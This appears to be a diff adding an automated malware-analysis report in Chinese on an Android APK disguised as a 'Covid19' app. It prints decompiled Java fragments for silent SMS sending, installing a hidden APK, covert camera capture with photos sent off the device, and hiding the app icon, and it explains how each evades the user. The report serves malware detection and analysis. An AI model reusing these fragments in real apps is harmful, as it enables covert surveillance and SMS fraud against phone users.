@@ -1,0 +1,165 @@
+{
+  "APK信息": {
+    "文件名": "34952977658d3ef094a505f51de73c4902265b856ec90d164a34ae178474558f.apk",
+    "sha256": "34952977658d3ef094a505f51de73c4902265b856ec90d164a34ae178474558f",
+    "包名": "com.example.dat.a8andoserverx",
+    "应用名": "Covid19",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 249.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\example\\dat\\a8andoserverx\\MainService;",
+          "method_signature": "sendSMS(String phoneNo, String msg)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(phoneNo, null, msg, null, null);",
+          "malicious_code_snippet_context": "  \n      public static boolean sendSMS(String phoneNo, String msg) {\n          try {\n>>>             SmsManager smsManager = SmsManager.getDefault();\n>>>             smsManager.sendTextMessage(phoneNo, null, msg, null, null);\n              return true;\n          } catch (Exception e) {\n              return false;",
+          "behavior_description": "该方法通过 SmsManager.getDefault() 获取短信管理器实例，调用 sendTextMessage() 在后台静默发送短信至指定号码，无需用户知情或授权。结合该样本为恶意软件且位于 MainService 后台服务中，phoneNo 和 msg 参数极可能来自远程C2服务器指令，用于实施短信欺诈、订阅扣费或向通讯录联系人传播恶意链接。数据流向：外部传入参数(phoneNo, msg) → SmsManager.sendTextMessage() 静默发送短信",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.INSTALL_PACKAGES"
+            ],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\example\\dat\\a8andoserverx\\MainActivity;",
+          "method_signature": "if(read <= 0)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intentx = new Intent(\"android.intent.action.VIEW\");\nintentx.setDataAndType(Uri.parse(\"file:///sdcard/.app.apk\"), \"application/vnd.android.package-archive\");\nintentx.setFlags(268435456);\nstartActivity(intentx);",
+          "malicious_code_snippet_context": "                  }\n                  in.close();\n                  out.close();\n>>>                 Intent intentx = new Intent(\"android.intent.action.VIEW\");\n>>>                 intentx.setDataAndType(Uri.parse(\"file:///sdcard/.app.apk\"), \"application/vnd.android.package-archive\");\n>>>                 intentx.setFlags(268435456);\n>>>                 startActivity(intentx);\n              } catch (IOException e2) {\n              } catch (Exception e3) {\n              }",
+          "behavior_description": "代码构造一个 ACTION_VIEW Intent，指向 SD 卡上的隐藏文件 /sdcard/.app.apk（文件名以点开头，在文件管理器中默认不可见），MIME 类型设为 application/vnd.android.package-archive，并加上 FLAG_ACTIVITY_NEW_TASK 标志，随后调用 startActivity() 调起系统 PackageInstaller 安装该 APK。在已确认的恶意样本背景下，这是恶意软件用于安装额外恶意组件或更新自身的典型手法，隐藏文件名进一步表明其试图规避用户察觉。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\example\\dat\\a8andoserverx\\MainService;",
+          "method_signature": "startUp(int cameraID)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.camera.setPreviewTexture(new SurfaceTexture(0));\nthis.camera.startPreview();\nThread.sleep(500L);\nthis.camera.takePicture(null, null, new Camera.PictureCallback() {\n    public void onPictureTaken(byte[] data, Camera camera) {\n        MainService.this.releaseCamera();\n        MainService.this.sendPhoto(data);\n    }\n});",
+          "malicious_code_snippet_context": "          Camera.Parameters parameters = this.camera.getParameters();\n          this.camera.setParameters(parameters);\n          try {\n>>>             this.camera.setPreviewTexture(new SurfaceTexture(0));\n>>>             this.camera.startPreview();\n>>>         } catch (Exception e) {\n>>>         }\n>>>         try {\n>>>             Thread.sleep(500L);\n>>>         } catch (InterruptedException e2) {\n>>>         }\n>>>         this.camera.takePicture(null, null, new Camera.PictureCallback() { // from class: com.example.dat.a8andoserverx.MainService.4\n              @Override // android.hardware.Camera.PictureCallback\n              public void onPictureTaken(byte[] data, Camera camera) {\n                  MainService.this.releaseCamera();",
+          "behavior_description": "代码在后台服务中通过Camera API秘密拍照。使用SurfaceTexture(0)创建一个空的预览表面，使摄像头预览对用户不可见（无预览画面），同时takePicture的shutterCallback传入null以消除快门声音，实现静默拍照。拍照完成后，获取到的图像数据(byte[])通过sendPhoto方法发送到远程服务器，构成隐私窃取行为。数据流向为：设备摄像头采集图像数据(Camera.takePicture) → 网络外传(sendPhoto)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\example\\dat\\a8andoserverx\\MainActivity;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(this, MainActivity.class);\np.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "          super.onCreate(savedInstanceState);\n          setContentView(R.layout.activity_main);\n          try {\n>>>             PackageManager p = getPackageManager();\n>>>             ComponentName componentName = new ComponentName(this, (Class<?>) MainActivity.class);\n>>>             p.setComponentEnabledSetting(componentName, 2, 1);\n          } catch (Exception e) {\n          }\n          if (Build.VERSION.SDK_INT >= 23) {",
+          "behavior_description": "代码在Activity的onCreate方法中，通过调用PackageManager.setComponentEnabledSetting将当前应用的主Activity组件设置为禁用状态（参数2对应COMPONENT_ENABLED_STATE_DISABLED），从而实现在桌面隐藏应用图标。隐藏图标后，立即启动后台服务MainService以在后台执行恶意逻辑，使用户难以察觉和卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
